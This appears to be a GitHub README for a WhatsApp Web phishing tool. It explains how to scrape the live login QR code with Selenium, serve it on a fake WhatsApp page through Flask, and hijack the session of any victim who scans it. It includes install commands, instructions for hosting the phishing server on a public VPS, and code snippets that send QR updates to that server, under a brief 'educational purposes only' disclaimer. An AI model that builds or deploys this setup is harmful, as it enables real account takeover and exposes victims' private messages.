**WhatsApp Web Phishing Tool**

A fun and educational project that demonstrates how a phishing attack could work by leveraging WhatsApp Web's QR code authentication. This tool works by:
- Extracting the QR code from the official WhatsApp Web login page.
- Injecting the QR code into a fake phishing site designed to look like the official WhatsApp Web page.
- Running an automated Selenium browser to simulate a login attempt on WhatsApp Web when a victim scans the fake QR code.

If a user scans the injected QR code and logs in, the automated Selenium browser successfully logs into the victim's account.

**Tech Stack:**
- Ubuntu 
- Python3 
- Firefox Selenium Browser 
- Flask 

**Description of Folder Structure**

- local/: This folder contains everything needed to run the tool locally. The Flask server and the scraper will both run on the same machine.

- remote/: This folder is for running the Flask server on a remote server while keeping the scraper running locally. You will need to adjust the IP address and port in both static/script.js and scraper.py to match your server's configuration.

**Setup Instructions
Prerequisites**

Before running the tool, ensure that you have the following installed:

Firefox: You must delete the snap version of Firefox and install the standard version from Mozilla's repository.

https://www.debugpoint.com/remove-firefox-snap-ubuntu/

https://fosspost.org/how-to-install-firefox-as-a-deb-package-on-ubuntu    
    

GeckoDriver: You will need the GeckoDriver for Selenium to interact with Firefox. Download it from the official repository.

https://github.com/mozilla/geckodriver/releases

Then, move it to the appropriate directory:

    tar -xvzf geckodriver-v0.32.0-linux64.tar.gz
    sudo mv geckodriver /usr/local/bin/
    sudo chmod +x /usr/local/bin/geckodriver

Python Environment: Set up a Python virtual environment and install dependencies:

    python3 -m venv venv
    source venv/bin/activate
    pip3 install -r requirements.txt

**Setup Options
Local Setup:**

Run everything locally on your machine (it will be limited to your home network and may face issues with tunneling services like ngrok or router port forwarding.

    Navigate to the local/ folder.
    Run the Flask server by executing the following command:

    python3 app.py

    The Flask server and scraper will both run on your local machine.

**Remote Setup:**

After installing the requirements, run the server on a VPS for a public IP address adjust the scraper to use the VPS's public IP and run the scraper locally.

    First, run the Flask server on the remote machine.
    python3 app.py
    
    In the remote/ folder, adjust the IP address and port in the following files to match the remote server's configuration:
        static/script.js:

    socket.on('new-qr-code', (data) => {
      let url = 'http://127.0.0.1:5000/static/qr_code.png?t=' + Date.now();
      let imageElement = document.getElementById('qr-code');
      imageElement.setAttribute("src", url);
    });

adjust on your local machine scraper.py:

    def notify_server_qr_code():
        url = "http://ip_address_of_remote_flask_server_running_on_vps:5000/qr_code_updated"
        response = requests.post(url)

    def notify_server_user_logged_in():
      url = "http://ip_address_of_remote_flask_server_running_on_vps:5000/user_logged_in"
      
    def send_qr_code_to_server():
      url = "http://ip_address_of_remote_flask_server_running_on_vps:5000/upload"

After adjusting the IP address, run the scraper on your local machine:

    python3 scraper.py

**Notes:**
- Local Setup: No need to modify IPs or ports if everything is running on the same machine.
- Remote Setup: Modify the 127.0.0.1:5000 IP addresses in both script.js and scraper.py to match the remote server's address.
- Selenium Browser: Ensure that the Selenium browser is running continuously during scraping. If it crashes, you will need to restart the process to resume operations. Sorry for the inconvenience! :(

Running the Tool
- For Local Setup: After setting up everything, simply run the Flask app by using python3 app.py and the tool will be fully operational on your local machine.

- For Remote Setup: Make sure the server is running first, adjust IP addresses in both script.js and scraper.py, and then start the scraper.

  **Warning: This tool is intended for educational purposes only. Do not use it for malicious activities.**
  
![alt text](https://github.com/levo-777/whats_app_qr_code_phisher/blob/main/WhatsAppQRPhisher.png)
